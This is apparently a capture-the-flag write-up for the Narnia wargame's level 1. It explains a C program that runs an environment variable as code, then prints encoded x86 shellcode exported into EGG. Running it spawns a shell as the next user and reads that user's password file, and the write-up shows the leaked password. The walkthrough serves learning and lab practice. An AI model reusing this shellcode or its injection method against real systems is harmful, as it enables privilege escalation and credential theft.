For this level, the source code is:
```
#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
```
Let's break down what this code means.
From this code:

    - int (*ret)(); is a function pointer.
    - The program expects an "EGG" environment variable.
    - If "EGG" exists, it assigns its address to ret and attempts to execute it.
    - This indicates that the program is susceptible to shellcode injection through the "EGG" environment variable.


From this, we will likely need to use the environment variable to inject some shellcode. However, before injecting the shellcode into the env variable, we need to find the right architecture and processor the system uses.
```
narnia1@gibson:/narnia$ uname -a
Linux gibson 6.2.0-1012-aws #12~22.04.1-Ubuntu SMP Thu Sep  7 14:01:24 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
narnia1@gibson:/narnia$ arch
x86_64
narnia1@gibson:/narnia$ lscpu
Architecture:            x86_64
  CPU op-mode(s):        32-bit, 64-bit
  Address sizes:         46 bits physical, 48 bits virtual
  Byte Order:            Little Endian
CPU(s):                  2
  On-line CPU(s) list:   0,1
Vendor ID:               GenuineIntel
  Model name:            Intel(R) Xeon(R) Platinum 8175M CPU @ 2.50GHz
```

Now, we can inject a shellcode exploit in the EGG variable like so:
```
narnia1@gibson:/narnia$ export EGG=$(echo -e "\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81")
narnia1@gibson:/narnia$ ./narnia1
Trying to execute EGG!
bash-5.1$ whoami
narnia2
bash-5.1$ cat /etc/narnia_pass/narnia2
Zzb6MIyceT
```

Overall, trying to find the right shellcode took an enormously long amount of time. First of all, I looked into exploitdb for shellcodes that could be injected which none of them worked. Next, I looked into shellstorm and finally was able to access the shell terminal and lookup the password from an elevated permission.
The shellcode which worked: https://shell-storm.org/shellcode/files/shellcode-607.html
